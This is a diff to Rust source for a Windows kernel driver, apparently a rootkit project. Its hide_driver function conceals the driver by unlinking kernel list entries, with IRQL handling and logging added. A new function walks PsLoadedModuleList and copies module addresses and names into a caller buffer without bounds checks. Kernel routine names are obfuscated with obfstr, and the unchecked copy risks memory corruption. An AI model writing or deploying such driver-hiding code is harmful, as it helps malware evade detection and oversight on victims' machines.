@@ -1,4 +1,6 @@
-use core::{mem::size_of, ptr::{addr_of_mut}, intrinsics::transmute};
+use core::{mem::size_of, ptr::{addr_of_mut}, intrinsics::{transmute, copy_nonoverlapping}};
+
+use common::ModuleInformation;
 use ntapi::ntldr::LDR_DATA_TABLE_ENTRY;
 use winapi::{shared::{ntdef::{LIST_ENTRY, UNICODE_STRING}}, km::wdm::{PEPROCESS, DEVICE_OBJECT, KIRQL}};
 use crate::{includes::{PsGetCurrentProcess}, process::get_function_base_address, string::create_unicode_string};
@@ -103,6 +105,7 @@ fn remove_links(current: *mut LIST_ENTRY) {
 
 type FnKeRaiseIrqlToDpcLevel = unsafe extern "system" fn() -> KIRQL;
 type FnKeLowerIrql = unsafe extern "system" fn(new_irql: KIRQL);
+type FnKeGetCurrentIrql = unsafe extern "system" fn() -> KIRQL;
 
 pub fn hide_driver(device_object: &mut DEVICE_OBJECT) -> Result<bool, &'static str> {
 
@@ -130,12 +133,29 @@ pub fn hide_driver(device_object: &mut DEVICE_OBJECT) -> Result<bool, &'static s
         return Err("KeLowerIrql is null");
     }
 
+    //KeGetCurrentIrql
+    let unicode_function_name = &mut create_unicode_string(
+        obfstr::wide!("KeGetCurrentIrql\0")
+    ) as *mut UNICODE_STRING;
+    
+    let ptr_ke_get_current_irql = get_function_base_address(unicode_function_name);
+
+    if ptr_ke_get_current_irql.is_null() {
+        log::error!("KeGetCurrentIrql is null");
+        return Err("KeGetCurrentIrql is null");
+    }
+
     //Convert to function pointers
+    #[allow(non_snake_case)]
+    let KeGetCurrentIrql = unsafe { transmute::<_, FnKeGetCurrentIrql>(ptr_ke_get_current_irql) };
     #[allow(non_snake_case)]
     let KeRaiseIrqlToDpcLevel = unsafe { transmute::<_, FnKeRaiseIrqlToDpcLevel>(ptr_ke_raise_irql_to_dpc_level) };
     #[allow(non_snake_case)]
     let KeLowerIrql = unsafe { transmute::<_, FnKeLowerIrql>(ptr_ke_lower_irql) };
 
+    //The KeGetCurrentIrql routine returns the current IRQL. For information about IRQLs, see Managing Hardware Priorities.
+    let current_irql = unsafe { KeGetCurrentIrql() };
+    log::info!("1st KeGetCurrentIrql: {:?}", current_irql);
 
     //The KeRaiseIrqlToDpcLevel routine raises the hardware priority to IRQL = DISPATCH_LEVEL, thereby masking off interrupts of equivalent or lower IRQL on the current processor.
     let irql = unsafe { KeRaiseIrqlToDpcLevel() };
@@ -163,10 +183,61 @@ pub fn hide_driver(device_object: &mut DEVICE_OBJECT) -> Result<bool, &'static s
     //The KeLowerIrql routine restores the IRQL on the current processor to its original value. For information about IRQLs, see Managing Hardware Priorities.
     unsafe { KeLowerIrql(irql) };
     log::info!("KeLowerIrql: IRQL is {:?}", irql);
+    
+    let current_irql = unsafe { KeGetCurrentIrql() };
+    log::info!("1st KeGetCurrentIrql: {:?}", current_irql);
 
     return Ok(true);
 }
 
+pub fn get_kernel_loaded_modules(module_information: *mut ModuleInformation, information: *mut usize) -> Result<bool, &'static str> {
+    //KeRaiseIrqlToDpcLevel
+    let unicode_function_name = &mut create_unicode_string(
+        obfstr::wide!("PsLoadedModuleList\0")
+    ) as *mut UNICODE_STRING;
+    
+    let ptr_ps_loaded_module_list = get_function_base_address(unicode_function_name) as *mut LDR_DATA_TABLE_ENTRY;
+
+    if ptr_ps_loaded_module_list.is_null() {
+        log::error!("ptr_ps_loaded_module_list is null");
+        return Err("ptr_ps_loaded_module_list is null");
+    }
+
+    log::info!("ptr_ps_loaded_module_list {:?}", ptr_ps_loaded_module_list);
+
+    let current = ptr_ps_loaded_module_list as *mut LIST_ENTRY;
+    let mut next = unsafe { (*ptr_ps_loaded_module_list).InLoadOrderLinks.Flink as *mut LIST_ENTRY };
+
+    let mut i = 0;
+
+    // loop through the linked list
+    while next as usize != current as usize {
+        
+        //Get module base and name
+        let mod_base = unsafe { (*(next as *mut LDR_DATA_TABLE_ENTRY)).DllBase };
+        let mod_name = unsafe { (*(next as *mut LDR_DATA_TABLE_ENTRY)).BaseDllName };
+        let name_slice = unsafe { core::slice::from_raw_parts(mod_name.Buffer, mod_name.Length as usize / 2) } ;
+        //log::info!("Module: {:?}", String::from_utf16_lossy(name_slice));
+
+        // Store the information in user buffer
+        //Address
+        unsafe { (*module_information.offset(i)).module_base = mod_base as usize };
+        
+        //Name
+        let dst = unsafe { (*module_information.offset(i)).module_name.as_mut() };
+        unsafe { copy_nonoverlapping(name_slice.as_ptr(), dst.as_mut_ptr(), name_slice.len()) };
+
+
+        i = i + 1; // increase i to keep track
+        
+        unsafe { (*information) += size_of::<ModuleInformation>() };
+        
+        // go to next module
+        next = unsafe { (*next).Flink };
+    }
+
+    return Ok(true);
+}
 
 /*
 0: kd> dt _DRIVER_OBJECT
